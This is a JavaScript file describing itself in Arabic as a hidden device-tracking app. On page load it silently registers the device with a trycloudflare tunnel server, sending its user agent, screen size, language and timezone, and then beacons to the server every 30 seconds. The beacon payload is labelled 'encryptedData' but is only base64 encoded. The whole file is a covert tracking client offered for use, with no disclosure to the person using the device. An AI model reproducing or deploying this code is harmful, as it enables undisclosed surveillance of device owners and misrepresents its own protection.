// =========================================
// 📱 تطبيق التتبع المخفي - Device Tracker
// =========================================
// الإصدار: 2.0.1
// الوصف: تطبيق خلفية يرسل بيانات الجهاز للخادم
// =========================================

// 🌐 رابط الخادم العام (محدّث تلقائياً)
const SERVER_URL = localStorage.getItem('SERVER_URL') || 'https://assign-place-picture-recommendation.trycloudflare.com';

// ⏱️ إعدادات الاتصال
const CHECK_IN_INTERVAL = 30000; // 30 ثانية
const HEARTBEAT_INTERVAL = 10000; // 10 ثواني
const MAX_RETRIES = 10;

// 🔐 بيانات الجهاز (محفوظة محلياً)
let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');

// 📊 حالة التطبيق
let isRunning = false;
let retryCount = 0;
let lastCheckIn = null;

// =========================================
// 🚀 بدء التطبيق
// =========================================

console.log('🚀 Device Tracker v2.0.1 starting...');
console.log('📡 Server URL:', SERVER_URL);

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM loaded - initializing...');
    // تأخير بسيط لضمان استقرار البيئة
    setTimeout(() => {
        initializeDevice();
        startHeartbeat();
    }, 1000);
});

// التعامل مع إعادة فتح التطبيق
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && isRunning) {
        console.log('👁️ App visible - forcing check-in');
        checkIn();
    }
});

// =========================================
// 🔐 تهيئة الجهاز والتسجيل
// =========================================

async function initializeDevice() {
    console.log('🔄 Initializing device...');
    
    try {
        // التحقق من وجود بيانات تسجيل سابقة
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ Already registered - skipping registration');
            isRunning = true;
            startCheckInService();
            return;
        }
        
        // تسجيل جديد - توليد معرفات فريدة
        console.log('🆕 New device - generating unique IDs...');
        
        clientId = 'client_' + Math.random().toString(36).substring(2, 15);
        deviceId = 'device_' + Math.random().toString(36).substring(2, 15);
        
        // حفظ البيانات محلياً
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        
        await registerDevice();
        
    } catch (error) {
        console.error('❌ Initialization error:', error.message);
        retryCount++;
        
        if (retryCount < MAX_RETRIES) {
            const delay = 5000 * retryCount;
            setTimeout(() => initializeDevice(), delay);
        }
    }
}

async function registerDevice() {
    console.log('📤 Registering with server...');
    
    try {
        const deviceInfo = {
            deviceName: 'Android Device',
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: '2.0.1',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language || 'ar',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            registeredAt: new Date().toISOString()
        };
        
        const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: clientId,
                deviceInfo: deviceInfo
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            encryptionKey = data.encryptionKey || 'default_key';
            localStorage.setItem('deviceId', data.deviceId || deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            deviceId = data.deviceId || deviceId;
            
            isRunning = true;
            retryCount = 0;
            startCheckInService();
        } else {
            throw new Error(data.error || 'Registration failed');
        }
        
    } catch (error) {
        console.error('❌ Registration failed:', error.message);
        setTimeout(() => {
            if (!isRunning) registerDevice();
        }, 15000);
    }
}

function startCheckInService() {
    checkIn();
    setInterval(async () => {
        if (isRunning) await checkIn();
    }, CHECK_IN_INTERVAL);
}

async function checkIn() {
    try {
        const systemInfo = {
            deviceId: deviceId,
            status: 'active',
            timestamp: new Date().toISOString()
        };
        
        const encryptedData = btoa(JSON.stringify(systemInfo));
        
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId: deviceId,
                encryptedData: encryptedData
            })
        });
        
        const data = await response.json();
        if (data.success) {
            console.log('📡 Check-in OK ✓');
        }
    } catch (error) {
        console.error('❌ Check-in error:', error.message);
    }
}

function startHeartbeat() {
    setInterval(() => {
        if (isRunning) console.log('💓 Heartbeat...');
    }, HEARTBEAT_INTERVAL);
}
